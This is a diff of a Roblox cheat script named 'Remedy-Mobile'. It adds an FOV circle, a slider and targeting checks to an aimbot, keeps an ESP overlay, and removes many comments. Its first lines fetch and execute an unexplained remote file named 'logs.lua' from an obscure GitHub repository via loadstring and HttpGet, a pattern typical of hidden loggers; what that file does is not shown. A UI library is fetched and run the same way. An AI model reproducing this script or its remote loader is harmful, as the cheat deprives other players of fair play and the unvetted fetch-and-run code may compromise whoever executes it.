@@ -1,22 +1,29 @@
 local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
 local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
 if externalScript then
-    -- Execute the external script
     externalScript()
 end
 
--- Load the DrRay library from the GitHub repository Library
+-- Load DrRay library
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 
--- Create a new window and set its title and theme
+-- Create window
 local window = DrRayLibrary:Load("Remedy-Mobile", "Default")
 
--- Create the first tab with an image ID
+-- Create Aim tab
 local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")
 
--- Variable to keep track of whether aimbot is on or off
+-- Variable for aimbot toggle
 local aimbotEnabled = false
+local aimbotFOVRadius = 150
+local aimbotFOVCircle = Drawing.new("Circle")
 
+aimbotFOVCircle.Visible = true
+aimbotFOVCircle.Thickness = 2
+aimbotFOVCircle.Color = Color3.fromRGB(255, 255, 0) -- Yellow color
+aimbotFOVCircle.NumSides = 30 -- Smoothing of the circle
+
+-- Toggle Aimbot
 tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
     aimbotEnabled = toggleState
     if aimbotEnabled then
@@ -26,25 +33,28 @@ tab1.newToggle("Aimbot", "Aimbot!", false, function(toggleState)
     end
 end)
 
--- Create the second tab with a different image ID
+-- FOV Slider
+tab1.newSlider("Aimbot FOV", 50, 300, 150, function(value)
+    aimbotFOVRadius = value
+    print("FOV Radius:", aimbotFOVRadius)
+end)
+
+-- ESP tab
 local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
 
--- ESP Code Variables
+-- ESP Variables
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local espBoxes = {}
 local espConnection = nil
 
--- Function to check if a player is on the same team
 local function isSameTeam(player)
     return LocalPlayer.Team and player.Team and LocalPlayer.Team == player.Team
 end
 
--- Function to create the ESP box
 local function createESPBox(player)
-    if espBoxes[player] then return end -- Prevent duplicate ESP boxes
-
+    if espBoxes[player] then return end
     local box = Drawing.new("Square")
     box.Visible = false
     box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
@@ -53,15 +63,13 @@ local function createESPBox(player)
     espBoxes[player] = box
 end
 
--- Function to remove the ESP box when a player leaves
 local function removeESPBox(player)
     if espBoxes[player] then
-        espBoxes[player]:Remove() -- Remove the drawing
+        espBoxes[player]:Remove()
         espBoxes[player] = nil
     end
 end
 
--- Function to update the ESP box
 local function updateESPBox(player, character)
     local box = espBoxes[player]
     if box and character and character:FindFirstChild("HumanoidRootPart") then
@@ -70,7 +78,7 @@ local function updateESPBox(player, character)
 
         if onScreen and not isSameTeam(player) then -- Team check added
             box.Visible = true
-            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z) -- Dynamic scaling based on distance
+            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z)
             box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
         else
             box.Visible = false
@@ -80,19 +88,16 @@ local function updateESPBox(player, character)
     end
 end
 
--- Function to toggle ESP for all players
 local function toggleESP(toggleState)
     if toggleState then
         print("ESP On")
 
-        -- Create ESP boxes for all players
         for _, player in pairs(Players:GetPlayers()) do
             if player ~= LocalPlayer then
                 createESPBox(player)
             end
         end
 
-        -- Update ESP boxes on every frame
         espConnection = RunService.RenderStepped:Connect(function()
             for _, player in pairs(Players:GetPlayers()) do
                 if player ~= LocalPlayer and player.Character then
@@ -101,12 +106,10 @@ local function toggleESP(toggleState)
             end
         end)
 
-        -- Detect when a player dies and redraw the ESP
         Players.PlayerRemoving:Connect(function(player)
             removeESPBox(player)
         end)
 
-        -- Detect when a player joins and create their ESP box
         Players.PlayerAdded:Connect(function(player)
             if player ~= LocalPlayer then
                 createESPBox(player)
@@ -121,18 +124,18 @@ local function toggleESP(toggleState)
             espConnection:Disconnect()
         end
         for _, box in pairs(espBoxes) do
-            box:Remove() -- Clear ESP
+            box:Remove()
         end
-        espBoxes = {} -- Clear the table
+        espBoxes = {}
     end
 end
 
--- Toggle ESP option in the Visuals tab
+-- ESP toggle
 tab2.newToggle("ESP", "ESP!", false, function(toggleState)
     toggleESP(toggleState)
 end)
 
--- Aimbot Logic
+-- Aimbot Utility Functions
 local function isPlayerVisible(player)
     local character = player.Character
     if character and character:FindFirstChild("HumanoidRootPart") then
@@ -151,12 +154,28 @@ local function isPlayerVisible(player)
     return false
 end
 
+local function isPlayerAlive(player)
+    local character = player.Character
+    return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
+end
+
+local function isInFOV(player)
+    local character = player.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(character.HumanoidRootPart.Position)
+        local screenPos = Vector2.new(screenPoint.X, screenPoint.Y)
+        local fovCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
+        return (screenPos - fovCenter).Magnitude <= aimbotFOVRadius
+    end
+    return false
+end
+
 local function getClosestVisiblePlayer()
     local closestPlayer = nil
     local shortestDistance = math.huge
 
     for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and not isSameTeam(player) and isPlayerVisible(player) then
+        if player ~= LocalPlayer and isPlayerAlive(player) and not isSameTeam(player) and isPlayerVisible(player) and isInFOV(player) then
             local hrp = player.Character:FindFirstChild("HumanoidRootPart")
             if hrp then
                 local screenPoint = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
@@ -172,7 +191,12 @@ local function getClosestVisiblePlayer()
     return closestPlayer
 end
 
+-- Aimbot FOV and Aiming Logic
 RunService.RenderStepped:Connect(function()
+    -- Update FOV Circle position and radius
+    aimbotFOVCircle.Radius = aimbotFOVRadius
+    aimbotFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
+
     if aimbotEnabled then
         local targetPlayer = getClosestVisiblePlayer()
         if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
